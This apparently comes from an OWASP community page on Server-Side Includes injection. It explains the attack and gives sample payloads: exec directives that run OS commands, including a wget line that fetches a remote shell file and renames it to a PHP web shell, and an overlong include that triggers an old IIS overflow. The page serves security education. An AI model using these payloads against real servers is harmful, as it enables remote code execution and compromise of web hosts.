---

layout: col-sidebar
title: Server-Side Includes (SSI) Injection
author: Weilin Zhong, Nsrav
contributors: KirstenS, Laurence Casey, Sam (Frenchie) Stewart, Glenn (devalias) Grant, kingthorin, Juliya Smith
permalink: /attacks/Server-Side_Includes_(SSI)_Injection
tags: attack, Server-Side Includes (SSI) Injection

---

{% include writers.html %}

## Description

SSIs are directives present on Web applications used to feed an HTML
page with dynamic contents. They are similar to CGIs, except that SSIs
are used to execute some actions before the current page is loaded or
while the page is being visualized. In order to do so, the web server
analyzes SSI before supplying the page to the user.

The Server-Side Includes attack allows the exploitation of a web
application by injecting scripts in HTML pages or executing arbitrary
codes remotely. It can be exploited through manipulation of SSI in use
in the application or force its use through user input fields.

It is possible to check if the application is properly validating input
fields data by inserting characters that are used in SSI directives,
like:

`< ! # = / . " - > and [a-zA-Z0-9] `

Another way to discover if the application is vulnerable is to verify
the presence of pages with extension .stm, .shtm and .shtml. However,
the lack of these type of pages does not mean that the application is
protected against SSI attacks.

In any case, the attack will be successful only if the web server
permits SSI execution without proper validation. This can lead to access
and manipulation of file system and process under the permission of the
web server process owner.

The attacker can access sensitive information, such as password files,
and execute shell commands. The SSI directives are injected in input
fields and they are sent to the web server. The web server parses and
executes the directives before supplying the page. Then, the attack
result will be viewable the next time that the page is loaded for the
user's browser.

## Examples

### Example 1

The commands used to inject SSI vary according to the server operational
system in use. The following commands represent the syntax that should
be used to execute OS commands.

**Linux:**

List files of directory:

`<!--#exec cmd="ls" -->`

Access directories:

`<!--#exec cmd="cd /root/dir/">`

Execution script:

`<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->`

**Windows:**

List files of directory:

`<!--#exec cmd="dir" -->`

Access directories:

`<!--#exec cmd="cd C:\admin\dir">`

### Example 2

Other SSI examples that can be used to access and set server
information:

To change the error message output:

`<!--#config errmsg="File not found, informs users and password"-->`

To show current document filename:

`<!--#echo var="DOCUMENT_NAME" -->`

To show virtual path and filename:

`<!--#echo var="DOCUMENT_URI" -->`

Using the “config” command and “timefmt” parameter, it is possible to
control the date and time output format:

`<!--#config timefmt="A %B %d %Y %r"-->`

Using the “fsize” command, it is possible to print the size of selected
file:

`<!--#fsize file="ssi.shtml" -->`

### Example 3

An old vulnerability in the IIS versions 4.0 and 5.0 allows an attacker
to obtain system privileges through a buffer overflow failure in a
dynamic link library (ssinc.dll). The “ssinc.dll” is used to interpreter
process Server-Side Includes.
[CVE 2001-0506](https://nvd.nist.gov/vuln/detail/CVE-2001-0506).

By creating a malicious page containing the SSI code bellow and forcing
the application to load this page ([Path Traversal](Path_Traversal) attack), 
it’s possible to perform this attack:

ssi_over.shtml

`<!--#include file=”UUUUUUUU...UU”-->`

PS: The number of “U” needs to be longer than 2049.

Forcing application to load the ssi_over.shtml page:

Non-malicious URL:

`www.vulnerablesite.org/index.asp?page=news.asp`

Malicious URL:

`www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml`

If the IIS return a blank page it indicates that an overflow has
occurred. In this case, the attacker might manipulate the procedure flow
and executes arbitrary code.

## Related [Attacks](https://owasp.org/www-community/attacks/)

- [Code Injection](Code_Injection)

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

- [Input Validation Vulnerability](PHP_File_Inclusion)

## Related [Controls](https://owasp.org/www-community/controls/)

- [Input Validation Vulnerability](https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs)

## References

- [SSI Examples](http://www.comptechdoc.org/independent/web/cgi/ssimanual/ssiexamples.html)
- [CGI and SSI Syntax and Examples](http://httpd.apache.org/docs/current/howto/ssi.html#basic)
- [Injection Flaws](https://owasp.org/www-community/Injection_Flaws)
